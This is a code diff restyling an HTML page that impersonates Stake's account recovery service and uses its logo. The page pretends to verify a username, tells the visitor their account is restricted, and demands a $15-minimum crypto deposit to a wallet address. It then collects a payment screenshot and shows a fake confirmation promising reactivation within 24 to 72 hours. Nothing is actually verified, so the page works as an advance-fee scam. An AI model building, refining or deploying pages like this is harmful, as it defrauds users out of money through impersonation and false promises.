@@ -2,167 +2,168 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>ReStakeAccess Account Recovery</title>
   <style>
-    body {
+    * {
+      box-sizing: border-box;
+    }
+    html, body {
       margin: 0;
-      font-family: Arial, sans-serif;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
       background-color: #0f212e;
-      color: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: flex-start;
+      color: #ffffff;
       min-height: 100vh;
-      padding: 40px 0;
-      overflow-y: auto;
-      overflow-x: hidden;
+      overflow-y: auto; /* ✅ Scroll allowed */
     }
     .container {
-      background-color: #2f4553;
-      padding: 20px;
-      border-radius: 12px;
-      width: 90%;
+      background-color: #1e2f40;
       max-width: 500px;
-      box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
-      position: relative;
-      z-index: 1;
+      margin: 40px auto;
+      padding: 25px;
+      border-radius: 16px;
+      box-shadow: 0 0 20px rgba(0,255,150,0.1);
+    }
+    .header {
+      text-align: center;
+    }
+    .header img {
+      width: 120px;
+      margin: 20px auto;
+    }
+    .header h2 {
+      color: #02dc05;
+      margin-bottom: 20px;
     }
     .form-group {
-      margin-bottom: 15px;
+      margin-bottom: 18px;
     }
     label {
-      display: block;
-      margin-bottom: 5px;
       font-weight: bold;
+      display: block;
+      margin-bottom: 6px;
     }
     input, select, button {
       width: 100%;
       padding: 10px;
-      border-radius: 6px;
+      border-radius: 8px;
       border: none;
       font-size: 1rem;
+    }
+    input, select {
+      background-color: #283b4c;
+      color: #fff;
     }
     button {
       background-color: #02dc05;
       color: white;
+      font-weight: bold;
       cursor: pointer;
+      transition: background 0.3s ease;
     }
     button:disabled {
-      background-color: #555;
+      background-color: #444;
       cursor: not-allowed;
     }
     .copy-btn {
-      margin-top: 5px;
-      background-color: #166ae0;
+      background-color: #2c8fff;
+      margin-top: 8px;
     }
     .message {
       margin-top: 10px;
-      font-size: 0.9rem;
-      color: #00ff9d;
+      font-size: 0.95rem;
+      color: #00ffae;
     }
     #popup {
       position: fixed;
+      z-index: 9999;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      background-color: #2f4553;
-      color: #fff;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.3);
-      z-index: 9999;
+      background-color: #1e2f40;
+      padding: 25px;
+      border-radius: 14px;
+      box-shadow: 0 0 30px rgba(0,255,150,0.2);
       text-align: center;
       display: none;
     }
-    #popup button {
-      margin-top: 10px;
-      padding: 10px 20px;
-      background-color: #02dc05;
+    #popup p {
+      color: #ffdc00;
+      font-weight: bold;
+      font-size: 1rem;
     }
-    .blur {
+    #popup button {
+      margin-top: 15px;
+      background-color: #02dc05;
+      color: #fff;
+      padding: 10px 20px;
+      border-radius: 8px;
+    }
+    .blur-effect {
       filter: blur(5px);
       pointer-events: none;
       user-select: none;
     }
-    .header {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    .header img {
-      width: 120px;
-      margin-bottom: 10px;
-      margin-top: 30px;
-    }
-    .header h2 {
-      color: #02dc05;
-      font-weight: bold;
-      font-family: 'Arial', sans-serif;
-      font-size: 1.5rem;
-    }
-    #popup p {
-      color: #ffdc00;
-      font-family: 'Arial', sans-serif;
-      font-weight: bold;
-      font-size: 1.1rem;
-    }
   </style>
 </head>
 <body>
-  <div id="main-content" class="container">
-    <div class="header">
-      <img src="stake-logo-white.png" alt="Stake Logo" />
-      <h2>Account Recovery</h2>
-    </div>
+  <div id="main-content">
+    <div class="container">
+      <div class="header">
+        <img src="stake-logo-white.png" alt="Stake Logo">
+        <h2>Account Recovery</h2>
+      </div>
 
-    <div class="form-group">
-      <label for="username">Username</label>
-      <input type="text" id="username" placeholder="Enter Stake Username" />
-      <button onclick="verifyUsername()">Verify</button>
-      <div class="message" id="verify-msg"></div>
-    </div>
+      <div class="form-group">
+        <label>Username</label>
+        <input type="text" id="username" placeholder="Enter Stake Username">
+        <button onclick="verifyUsername()">Verify</button>
+        <div class="message" id="verify-msg"></div>
+      </div>
 
-    <div class="form-group">
-      <label for="coin">Select Coin</label>
-      <select id="coin" onchange="updateAddress()">
-        <option value="">--Select Coin--</option>
-        <option value="usdt">USDT</option>
-        <option value="btc">BTC</option>
-        <option value="trx">TRX</option>
-        <option value="eth">Ethereum</option>
-      </select>
-    </div>
+      <div class="form-group">
+        <label>Coin</label>
+        <select id="coin" onchange="updateAddress()">
+          <option value="">--Select Coin--</option>
+          <option value="usdt">USDT</option>
+          <option value="btc">BTC</option>
+          <option value="trx">TRX</option>
+          <option value="eth">ETH</option>
+        </select>
+      </div>
 
-    <div class="form-group">
-      <label for="network">Select Network</label>
-      <select id="network" onchange="updateAddress()">
-        <option value="">--Select Network--</option>
-        <option value="trc20">TRC20</option>
-        <option value="bsc">BSC</option>
-      </select>
-    </div>
+      <div class="form-group">
+        <label>Network</label>
+        <select id="network" onchange="updateAddress()">
+          <option value="">--Select Network--</option>
+          <option value="trc20">TRC20</option>
+          <option value="bsc">BSC</option>
+        </select>
+      </div>
 
-    <div class="form-group">
-      <label for="address">Wallet Address</label>
-      <input type="text" id="address" readonly />
-      <button class="copy-btn" onclick="copyAddress()">Copy</button>
-    </div>
+      <div class="form-group">
+        <label>Wallet Address</label>
+        <input type="text" id="address" readonly>
+        <button class="copy-btn" onclick="copyAddress()">Copy</button>
+      </div>
 
-    <div class="form-group">
-      <label for="amount">Enter Amount (USD)</label>
-      <input type="number" id="amount" />
-    </div>
+      <div class="form-group">
+        <label>Amount ($)</label>
+        <input type="number" id="amount" placeholder="Enter Amount">
+      </div>
 
-    <div class="form-group">
-      <label for="screenshot">Upload Screenshot</label>
-      <input type="file" id="screenshot" />
-    </div>
+      <div class="form-group">
+        <label>Upload Screenshot</label>
+        <input type="file" id="screenshot">
+      </div>
 
-    <button id="submitBtn" onclick="submitForm()" disabled>Submit</button>
+      <button id="submitBtn" onclick="submitForm()" disabled>Submit</button>
+    </div>
   </div>
 
   <div id="popup">
-    <p>Your account recovery request has been successfully received. We have forwarded your request to the Stake technical team for prompt action. Your Stake account will be fully reactivated within 24 to 72 hours.</p>
+    <p>Your account recovery request has been received.<br>We forward your query to the Stake technical team.<br>Your Stake account will be fully active within 24 - 72 hours.</p>
     <button onclick="closePopup()">OK</button>
   </div>
 
@@ -188,7 +189,7 @@
       const msg = document.getElementById('verify-msg');
       msg.innerHTML = 'Verifying...';
       setTimeout(() => {
-        msg.innerHTML = 'Your Stake account is currently restricted to withdrawal-only mode. To unlock full access, a minimum deposit of $15 is required. This amount will be safely credited to your Stake account, ensuring the security and protection of your funds.';
+        msg.innerHTML = 'Your Stake account is currently restricted to withdrawal-only mode. To unlock full access, a minimum deposit of $15 is required.';
       }, 1500);
     }
 
@@ -210,7 +211,7 @@
       address.select();
       address.setSelectionRange(0, 99999);
       navigator.clipboard.writeText(address.value);
-      alert('Address copied!');
+      alert("Address copied!");
     }
 
     function checkForm() {
@@ -225,12 +226,12 @@
       btn.disabled = !(username && coin && network && address && amount && screenshot);
     }
 
-    document.querySelectorAll('input, select').forEach(input => {
-      input.addEventListener('change', checkForm);
+    document.querySelectorAll('input, select').forEach(el => {
+      el.addEventListener('change', checkForm);
     });
 
     function submitForm() {
-      document.getElementById('main-content').classList.add('blur');
+      document.getElementById('main-content').classList.add('blur-effect');
       document.getElementById('popup').style.display = 'block';
     }
 
